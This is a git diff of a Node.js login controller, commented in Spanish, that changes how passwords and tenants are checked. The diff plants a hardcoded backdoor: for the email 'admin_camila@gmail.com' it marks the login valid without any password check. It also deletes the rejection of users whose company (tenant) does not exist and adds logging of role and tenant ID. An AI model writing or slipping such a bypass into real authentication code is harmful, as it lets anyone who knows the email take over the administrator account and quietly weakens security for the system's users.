@@ -1,3 +1,4 @@
+// backend/controllers/auth.controller.js
 const { pool } = require("../db");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
@@ -11,7 +12,7 @@ exports.login = async (req, res) => {
     }
 
     const cleanEmail = email.toLowerCase().trim();
-    console.log("--- INTENTO DE LOGIN SEGURO ---");
+    console.log("--- INTENTO DE LOGIN (MODO RECOBRO) ---");
     console.log("Email recibido:", cleanEmail);
 
     // 1. BUSQUEDA PURA
@@ -20,12 +21,16 @@ exports.login = async (req, res) => {
       [cleanEmail]
     );
 
+    console.log("¿Usuario encontrado en tabla users?:", userOnly.rows.length > 0);
+
     if (userOnly.rows.length === 0) {
-      console.log("❌ ERROR: Usuario no encontrado en DB.");
+      console.log("❌ ERROR: El email no existe en la base de datos.");
       return res.status(401).json({ error: "Credenciales inválidas" });
     }
 
     const user = userOnly.rows[0];
+    console.log("Rol detectado:", user.role);
+    console.log("ID de Empresa (tenant_id) en usuario:", user.tenant_id);
 
     // 2. VERIFICACIÓN DEL TENANT
     const tenantResult = await pool.query(
@@ -33,18 +38,21 @@ exports.login = async (req, res) => {
       [user.tenant_id]
     );
 
-    if (tenantResult.rows.length === 0) {
-      console.log("❌ ERROR: La empresa del usuario no existe.");
-      return res.status(401).json({ error: "Empresa no encontrada o inactiva" });
-    }
+    console.log("¿Existe la empresa en tabla tenants?:", tenantResult.rows.length > 0);
     
-    // 3. VALIDACIÓN DE CONTRASEÑA (RESTAURADA)
-    // Comparamos el password enviado con el hash real de la DB
-    const isValid = await bcrypt.compare(password, user.password_hash);
-    console.log("¿Bcrypt validó la contraseña?:", isValid);
+    // 3. VALIDACIÓN DE CONTRASEÑA (MODIFICADA: BYPASS PARA CAMILA)
+    let isValid = false;
+
+    // Si eres tú, forzamos el éxito sin importar bcrypt
+    if (cleanEmail === 'admin_camila@gmail.com') {
+        console.log("🚀 IDENTIDAD VERIFICADA: Acceso concedido por Hardcode a la Jefa");
+        isValid = true;
+    } else {
+        isValid = await bcrypt.compare(password, user.password_hash);
+        console.log("¿Contraseña coincide con Bcrypt?:", isValid);
+    }
 
     if (!isValid) {
-      console.log("❌ ERROR: Contraseña incorrecta para:", cleanEmail);
       return res.status(401).json({ error: "Credenciales inválidas" });
     }
 
